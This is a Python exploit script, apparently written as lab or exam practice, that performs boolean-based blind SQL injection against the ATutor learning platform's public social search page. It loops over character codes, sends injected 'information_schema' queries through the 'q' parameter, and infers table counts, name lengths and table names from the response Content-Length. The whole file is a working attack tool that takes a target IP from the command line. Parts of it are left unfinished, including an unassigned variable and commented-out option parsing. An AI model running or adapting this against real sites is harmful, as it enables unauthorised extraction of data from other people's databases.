import requests
import sys

def searchFriends_sqli(ip, inj_str):
    bool = False
    for j in range(48, 58):
        # now we update the sqli - First REQUESTER - for intial Counting of Tables - ASCII Numeric Range only
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j

def getTables_sqli(ip, inj_str):
    # SECOND REQUESTER for extracting TABLE_NAMES - ALPHA-NUMERIC ascii based extraction
    bool = False
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            bool = True
            return j

class blind:
    def __init__(self):
      #TODO define options next to self above!
#    self.target = options.target
#    self.lhost = options.rport
        tableN = ""
        tableJ = ""
        tableCL = ""
        ip = sys.argv[1]
        self.tableN = tableN
        self.tableJ = tableJ
        self.tableCL = tableCL
        self.ip = ip


    def getTables_number(self):
        for i in range(1, 4):

            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/table_name)),"+ str(i) + ",1))/**/from/**/information_schema.tables)=" + "[CHAR]" + "%23"
            extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            self.tableN += str(extracted_char)
        print "\r\n" + self.tableN

        for o in range(0, int(self.tableN)):
            print "\r\n======== Tables Name Char Count ==========\r\n"
            self.getTablesChar_number(o)

    def getTablesChar_number(self, o):
        for y in range(1, 3):
            try: 
                injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(table_name),"+ str(y) +",1))/**/from/**/information_schema.tables/**/order/**/by/**/table_name/**/limit/**/" + str(o)  + ",1)=" + "[CHAR]" + "%23"
                extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                self.tableCL += str(extracted_char)

            except Exception:
                pass
        tableCL = self.tableCL
        tableCL = int(tableCL) + 1
        print "\r\n============= Dumping Table Name ===============\r\n"
        print "TableCl value is: " + str(tableCL)
        self.dropTables_name(o, tableCL)
        self.tableCL = ""
        tableCL = ""


    def dropTables_name(self, o, tableCL):
        for x in range(1, int(tableCL)):
            try:
                injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/table_name)/**/FROM/**/INFORMATION_SCHEMA.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/" + str(o) + ",1)," + str(x)  + ",1))))=" + "[CHAR]" + "%23"
                extracted_char = chr(getTables_sqli(self.ip, injection_string))
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                tableJ += str(extracted_char)
            except Exception:
                pass


def main():
#    parser = OptionParser()
#    parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
#    parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")
#    (options, args) = parser.parse_args()
#    if options.target:
#      sBlind = blind(options)
#      sBlind.start()

    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]
    print "(m4ud) Blind sql-jutsu \r\n"
    print "[+] Retrieving numbers of tables in the Database...."

    tableN = ""
    tableJ = ""
    tableCL = ""
    tableN = blind().getTables_number()


    print "\n(+) done!"

if __name__ == "__main__":
    main()
